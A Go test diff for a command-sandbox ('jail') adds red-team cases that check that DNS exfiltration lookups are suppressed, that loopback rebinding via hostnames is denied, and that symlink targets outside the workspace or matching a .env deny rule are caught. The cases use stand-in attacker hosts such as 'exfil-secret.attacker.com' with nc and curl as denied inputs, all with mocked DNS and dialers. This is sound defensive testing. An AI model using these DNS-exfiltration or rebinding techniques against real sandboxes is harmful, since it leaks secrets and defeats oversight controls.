@@ -2006,18 +2006,304 @@ func TestRedTeam6_NetPolicyUnspecifiedLoopbackCGNATAndListenRebinding(t *testing
 		t.Fatalf("expected ListenPacket rebinding to 0.0.0.0 denied, got %v", err)
 	}
 
-	// Hostname resolving to 127.0.0.1 succeeds AND binds pinned 127.0.0.1:port directly!
+	// Remote hostname resolving to 127.0.0.1 MUST ALSO be rejected as loopback rebinding!
+	jailListen.lookupIPAddr = func(ctx context.Context, host string) ([]net.IPAddr, error) {
+		return []net.IPAddr{{IP: net.ParseIP("127.0.0.1")}}, nil
+	}
+	if _, err := jailListen.Listen(context.Background(), "nc", "tcp", "bind.svc.local:0"); !errors.Is(err, os.ErrPermission) {
+		t.Fatalf("expected Listen remote-hostname rebinding to 127.0.0.1 denied, got %v", err)
+	}
+
+	// Literal "localhost" resolving to 127.0.0.1 succeeds AND binds pinned 127.0.0.1:port directly!
 	var listenLookups atomic.Int32
 	jailListen.lookupIPAddr = func(ctx context.Context, host string) ([]net.IPAddr, error) {
 		listenLookups.Add(1)
 		return []net.IPAddr{{IP: net.ParseIP("127.0.0.1")}}, nil
 	}
-	ln, err := jailListen.Listen(context.Background(), "nc", "tcp", "bind.svc.local:0")
+	ln, err := jailListen.Listen(context.Background(), "nc", "tcp", "localhost:0")
 	if err != nil {
-		t.Fatalf("expected Listen on bind.svc.local -> 127.0.0.1 allowed, got %v", err)
+		t.Fatalf("expected Listen on localhost -> 127.0.0.1 allowed, got %v", err)
 	}
 	defer ln.Close()
 	if listenLookups.Load() != 1 || !strings.HasPrefix(ln.Addr().String(), "127.0.0.1:") {
 		t.Fatalf("expected 1 lookup and pinned 127.0.0.1 listener, got lookups=%d addr=%s", listenLookups.Load(), ln.Addr().String())
+	}
+}
+
+func TestRedTeam7_DNSExfilLoopbackRebindAndOpLinkTargetPath(t *testing.T) {
+	ws := t.TempDir()
+	outside := t.TempDir()
+	noopDial := func(ctx context.Context, network, address string) (net.Conn, error) {
+		c1, c2 := net.Pipe()
+		_ = c2.Close()
+		return c1, nil
+	}
+
+	// 1. DNS Exfiltration Prevention in DialContext, Listen, and ListenPacket:
+	//    - Default --net deny (even with Approver + unrelated session grants!)
+	//    - --net loopback (including *.localhost!)
+	//    - --net deny --allow-net api.github.com:443
+	var dnsQueries atomic.Int32
+	mockDNS := func(ctx context.Context, host string) ([]net.IPAddr, error) {
+		dnsQueries.Add(1)
+		if strings.EqualFold(host, "localhost") {
+			return []net.IPAddr{{IP: net.ParseIP("127.0.0.1")}}, nil
+		}
+		return []net.IPAddr{{IP: net.ParseIP("93.184.216.34")}}, nil
+	}
+
+	cfgDeny := DefaultJailConfig(ws)
+	cfgDeny.OutsideAction = DecisionAsk
+	cfgDeny.Approver = func(ctx context.Context, req AccessRequest) (Decision, error) {
+		return DecisionDeny, nil
+	}
+	cfgDeny.Net.TransportDialer = noopDial
+	jailDeny, err := NewJail(cfgDeny)
+	if err != nil {
+		t.Fatal(err)
+	}
+	jailDeny.lookupIPAddr = mockDNS
+	jailDeny.GrantSession(OpRead, filepath.Join(outside, "unrelated.txt"))
+
+	dnsQueries.Store(0)
+	if _, err := jailDeny.DialContext(context.Background(), "nc", "tcp", "exfil-secret.attacker.com:80"); !errors.Is(err, os.ErrPermission) {
+		t.Fatalf("expected DialContext denied, got %v", err)
+	}
+	if _, err := jailDeny.Listen(context.Background(), "nc", "tcp", "exfil-secret.attacker.com:8080"); !errors.Is(err, os.ErrPermission) {
+		t.Fatalf("expected Listen denied, got %v", err)
+	}
+	if _, err := jailDeny.ListenPacket(context.Background(), "nc", "udp", "exfil-secret.attacker.com:8080"); !errors.Is(err, os.ErrPermission) {
+		t.Fatalf("expected ListenPacket denied, got %v", err)
+	}
+	if dnsQueries.Load() != 0 {
+		t.Fatalf("DNS exfiltration leak under --net deny! lookupIPAddr called %d times", dnsQueries.Load())
+	}
+
+	// --net loopback: blocks exfil domains AND *.localhost with zero DNS lookups, allows literal localhost.
+	cfgLoop := DefaultJailConfig(ws)
+	cfgLoop.Net = NetPolicy{
+		Default:         DecisionDeny,
+		AllowLoopback:   true,
+		BlockPrivateLAN: true,
+		AllowListen:     DecisionDeny,
+		TransportDialer: noopDial,
+	}
+	jailLoop, err := NewJail(cfgLoop)
+	if err != nil {
+		t.Fatal(err)
+	}
+	jailLoop.lookupIPAddr = mockDNS
+
+	dnsQueries.Store(0)
+	for _, exfilHost := range []string{"secret.attacker.com:80", "secret.localhost:80"} {
+		if _, err := jailLoop.DialContext(context.Background(), "nc", "tcp", exfilHost); !errors.Is(err, os.ErrPermission) {
+			t.Fatalf("expected loopback-mode DialContext(%s) denied, got %v", exfilHost, err)
+		}
+		if _, err := jailLoop.Listen(context.Background(), "nc", "tcp", exfilHost); !errors.Is(err, os.ErrPermission) {
+			t.Fatalf("expected loopback-mode Listen(%s) denied, got %v", exfilHost, err)
+		}
+	}
+	if dnsQueries.Load() != 0 {
+		t.Fatalf("DNS exfiltration leak under --net loopback! lookupIPAddr called %d times", dnsQueries.Load())
+	}
+	cLocal, err := jailLoop.DialContext(context.Background(), "nc", "tcp", "localhost:8080")
+	if err != nil {
+		t.Fatalf("expected localhost:8080 allowed under --net loopback, got %v", err)
+	}
+	_ = cLocal.Close()
+	if dnsQueries.Load() != 1 {
+		t.Fatalf("expected 1 lookup for localhost, got %d", dnsQueries.Load())
+	}
+
+	// Host-scoped --allow-net api.github.com:443: zero DNS lookups for unlisted hosts or wrong ports!
+	cfgScoped := DefaultJailConfig(ws)
+	cfgScoped.Net = NetPolicy{
+		Default:         DecisionDeny,
+		AllowLoopback:   false,
+		BlockPrivateLAN: true,
+		AllowListen:     DecisionDeny,
+		TransportDialer: noopDial,
+		Rules: []NetRule{
+			{
+				HostPattern: "api.github.com",
+				Ports:       []int{443},
+				Ops:         []AccessOp{OpNetConnect},
+				Decision:    DecisionAllow,
+			},
+		},
+	}
+	jailScoped, err := NewJail(cfgScoped)
+	if err != nil {
+		t.Fatal(err)
+	}
+	jailScoped.lookupIPAddr = mockDNS
+
+	dnsQueries.Store(0)
+	for _, bad := range []string{"exfil.attacker.com:80", "exfil.attacker.com:443", "api.github.com:80"} {
+		if _, err := jailScoped.DialContext(context.Background(), "curl", "tcp", bad); !errors.Is(err, os.ErrPermission) {
+			t.Fatalf("expected %s denied, got %v", bad, err)
+		}
+	}
+	if _, err := jailScoped.Listen(context.Background(), "nc", "tcp", "api.github.com:443"); !errors.Is(err, os.ErrPermission) {
+		t.Fatal("expected Listen on connect-only allow-net rule denied")
+	}
+	if dnsQueries.Load() != 0 {
+		t.Fatalf("DNS exfiltration leak under --allow-net api.github.com:443! lookups=%d", dnsQueries.Load())
+	}
+	cAllowed, err := jailScoped.DialContext(context.Background(), "curl", "tcp", "api.github.com:443")
+	if err != nil {
+		t.Fatalf("expected api.github.com:443 allowed, got %v", err)
+	}
+	_ = cAllowed.Close()
+	if dnsQueries.Load() != 1 {
+		t.Fatalf("expected 1 lookup for api.github.com:443, got %d", dnsQueries.Load())
+	}
+
+	// 2. Unlisted & session-granted remote hostnames rebinding to loopback when AllowLoopback: true!
+	var dialCalls atomic.Int32
+	cfgRebind := DefaultJailConfig(ws)
+	cfgRebind.Approver = func(ctx context.Context, req AccessRequest) (Decision, error) {
+		return DecisionAllowSession, nil
+	}
+	cfgRebind.Net = NetPolicy{
+		Default:         DecisionAsk,
+		AllowLoopback:   true,
+		BlockPrivateLAN: true,
+		AllowListen:     DecisionAsk,
+		TransportDialer: func(ctx context.Context, network, address string) (net.Conn, error) {
+			dialCalls.Add(1)
+			return noopDial(ctx, network, address)
+		},
+	}
+	jailRebind, err := NewJail(cfgRebind)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	// Initial connection to public IP succeeds and caches DecisionAllowSession for evil.attacker.com:8080.
+	jailRebind.lookupIPAddr = func(ctx context.Context, host string) ([]net.IPAddr, error) {
+		return []net.IPAddr{{IP: net.ParseIP("93.184.216.34")}}, nil
+	}
+	cInit, err := jailRebind.DialContext(context.Background(), "curl", "tcp", "evil.attacker.com:8080")
+	if err != nil {
+		t.Fatalf("expected initial public IP dial allowed, got %v", err)
+	}
+	_ = cInit.Close()
+
+	// DNS flips to 127.0.0.1 AND round-robin [93.184.216.34, 127.0.0.1] — BOTH must be hard-blocked!
+	dialCalls.Store(0)
+	for _, ips := range [][]net.IPAddr{
+		{{IP: net.ParseIP("127.0.0.1")}},
+		{{IP: net.ParseIP("93.184.216.34")}, {IP: net.ParseIP("127.0.0.1")}},
+	} {
+		jailRebind.lookupIPAddr = func(ctx context.Context, host string) ([]net.IPAddr, error) {
+			return ips, nil
+		}
+		if _, err := jailRebind.DialContext(context.Background(), "curl", "tcp", "evil.attacker.com:8080"); !errors.Is(err, os.ErrPermission) {
+			t.Fatalf("remote hostname rebinding to loopback %v was NOT blocked when AllowLoopback=true: %v", ips, err)
+		}
+	}
+	if dialCalls.Load() != 0 {
+		t.Fatalf("TransportDialer called %d times on loopback-rebound round-robin DNS!", dialCalls.Load())
+	}
+	if _, err := jailRebind.Listen(context.Background(), "nc", "tcp", "evil.attacker.com:0"); !errors.Is(err, os.ErrPermission) {
+		t.Fatalf("expected Listen on remote hostname resolving to 127.0.0.1 blocked, got %v", err)
+	}
+
+	// Verify explicit NetRule{HostPattern: "localhost", Decision: DecisionAsk} is NOT shadowed by AllowLoopback!
+	var localhostPrompts atomic.Int32
+	cfgLocalAsk := DefaultJailConfig(ws)
+	cfgLocalAsk.Approver = func(ctx context.Context, req AccessRequest) (Decision, error) {
+		localhostPrompts.Add(1)
+		return DecisionAllow, nil
+	}
+	cfgLocalAsk.Net = NetPolicy{
+		Default:         DecisionDeny,
+		AllowLoopback:   true,
+		BlockPrivateLAN: true,
+		TransportDialer: noopDial,
+		Rules: []NetRule{
+			{
+				HostPattern: "localhost",
+				Decision:    DecisionAsk,
+			},
+		},
+	}
+	jailLocalAsk, err := NewJail(cfgLocalAsk)
+	if err != nil {
+		t.Fatal(err)
+	}
+	jailLocalAsk.lookupIPAddr = mockDNS
+	cLA, err := jailLocalAsk.DialContext(context.Background(), "curl", "tcp", "localhost:8080")
+	if err != nil {
+		t.Fatalf("expected localhost dial approved, got %v", err)
+	}
+	_ = cLA.Close()
+	if localhostPrompts.Load() != 1 {
+		t.Fatalf("expected NetRule{HostPattern:\"localhost\", Decision:DecisionAsk} to prompt Approver once, got %d", localhostPrompts.Load())
+	}
+
+	// 3. Direct Jail.CheckAccess on OpLink with TargetPath folds both realPath and lexPath via decisionSeverity!
+	outsideTarget := filepath.Join(outside, "target.txt")
+	if err := os.WriteFile(outsideTarget, []byte("x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	benignInside := filepath.Join(ws, "benign.txt")
+	if err := os.WriteFile(benignInside, []byte("ok"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	var linkPrompts atomic.Int32
+	allowLinkPrompt := false
+	cfgLink := DefaultJailConfig(ws)
+	cfgLink.OutsideAction = DecisionAsk
+	cfgLink.Rules = []PathRule{
+		{Pattern: "**/.env*", Decision: DecisionDeny},
+	}
+	cfgLink.Approver = func(ctx context.Context, req AccessRequest) (Decision, error) {
+		linkPrompts.Add(1)
+		if allowLinkPrompt {
+			return DecisionAllow, nil
+		}
+		return DecisionDeny, nil
+	}
+	jailLink, err := NewJail(cfgLink)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	// Path inside Roots + TargetPath outside Roots under OutsideAction: DecisionAsk -> MUST fold to DecisionAsk!
+	err = jailLink.CheckAccess(context.Background(), AccessRequest{
+		Op:         OpLink,
+		Command:    "ln",
+		Path:       filepath.Join(ws, "inside_link"),
+		TargetPath: outsideTarget,
+	})
+	if !errors.Is(err, os.ErrPermission) || linkPrompts.Load() != 1 {
+		t.Fatalf("expected OpLink with outside TargetPath to prompt Approver and deny, err=%v prompts=%d", err, linkPrompts.Load())
+	}
+	allowLinkPrompt = true
+	if err := jailLink.CheckAccess(context.Background(), AccessRequest{
+		Op:         OpLink,
+		Command:    "ln",
+		Path:       filepath.Join(ws, "inside_link"),
+		TargetPath: outsideTarget,
+	}); err != nil || linkPrompts.Load() != 2 {
+		t.Fatalf("expected OpLink with outside TargetPath to succeed when Approver allows, err=%v prompts=%d", err, linkPrompts.Load())
+	}
+
+	// TargetPath matching deny rule via lexPath (symlink ws/.env.alias -> ws/benign.txt) -> statically DENIED!
+	envAlias := filepath.Join(ws, ".env.alias")
+	if err := os.Symlink(benignInside, envAlias); err == nil {
+		beforePrompts := linkPrompts.Load()
+		err := jailLink.CheckAccess(context.Background(), AccessRequest{
+			Op:         OpLink,
+			Command:    "ln",
+			Path:       filepath.Join(ws, "safe_dst"),
+			TargetPath: envAlias,
+		})
+		if !errors.Is(err, os.ErrPermission) || linkPrompts.Load() != beforePrompts {
+			t.Fatalf("expected OpLink TargetPath lexPath (.env.alias) statically denied without prompting, err=%v prompts=%d->%d", err, beforePrompts, linkPrompts.Load())
+		}
 	}
 }
